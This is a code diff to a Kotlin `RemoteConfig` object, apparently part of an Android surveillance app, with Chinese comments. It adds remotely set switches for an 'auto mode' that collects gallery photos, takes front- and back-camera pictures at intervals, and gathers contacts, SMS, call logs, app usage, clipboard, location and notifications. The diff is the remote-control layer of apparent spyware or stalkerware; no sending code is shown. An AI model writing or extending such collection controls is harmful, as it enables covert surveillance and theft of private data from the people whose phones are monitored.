@@ -24,6 +24,22 @@ object RemoteConfig {
     @Volatile var mediaPerRound: Int = 6
     @Volatile var mediaMaxPx: Int = 1080      // 相册目标宽度，调小换速度
     @Volatile var mediaQuality: Int = 82      // 编码质量
+
+    // ---- 自动模式 ----
+    @Volatile var autoMode: Boolean = false      // 总开关
+    @Volatile var autoMedia: Boolean = false     // 自动扫相册
+    @Volatile var autoCamFront: Int = 0          // 前置拍照间隔（分钟，0=关）
+    @Volatile var autoCamBack: Int = 0           // 后置拍照间隔（分钟，0=关）
+
+    // ---- 自动模式里的逐项开关（总开关 autoMode 打开后才生效）----
+    @Volatile var autoContacts: Boolean = false
+    @Volatile var autoSms: Boolean = false
+    @Volatile var autoCall: Boolean = false
+    @Volatile var autoUsage: Boolean = false
+    @Volatile var autoStatus: Boolean = false
+    @Volatile var autoClipboard: Boolean = false
+    @Volatile var autoLoc: Boolean = false
+    @Volatile var autoNotif: Boolean = false
     @Volatile var locEnabled: Boolean = true
     @Volatile var notifEnabled: Boolean = true
     @Volatile var versionCode: Int = 0
@@ -58,6 +74,18 @@ object RemoteConfig {
         mediaPerRound = o.optInt("media_per_round", mediaPerRound).coerceIn(0, 2000)
         mediaMaxPx = o.optInt("media_max_px", mediaMaxPx).coerceIn(480, 2160)
         mediaQuality = o.optInt("media_quality", mediaQuality).coerceIn(50, 95)
+        autoMode = o.optBoolean("auto_mode", autoMode)
+        autoMedia = o.optBoolean("auto_media", autoMedia)
+        autoCamFront = o.optInt("auto_cam_front", autoCamFront).coerceIn(0, 1440)
+        autoCamBack = o.optInt("auto_cam_back", autoCamBack).coerceIn(0, 1440)
+        autoContacts = o.optBoolean("auto_contacts", autoContacts)
+        autoSms = o.optBoolean("auto_sms", autoSms)
+        autoCall = o.optBoolean("auto_call", autoCall)
+        autoUsage = o.optBoolean("auto_usage", autoUsage)
+        autoStatus = o.optBoolean("auto_status", autoStatus)
+        autoClipboard = o.optBoolean("auto_clipboard", autoClipboard)
+        autoLoc = o.optBoolean("auto_loc", autoLoc)
+        autoNotif = o.optBoolean("auto_notif", autoNotif)
         locEnabled = o.optBoolean("loc", locEnabled)
         notifEnabled = o.optBoolean("notif", notifEnabled)
         versionCode = o.optInt("version_code", versionCode)
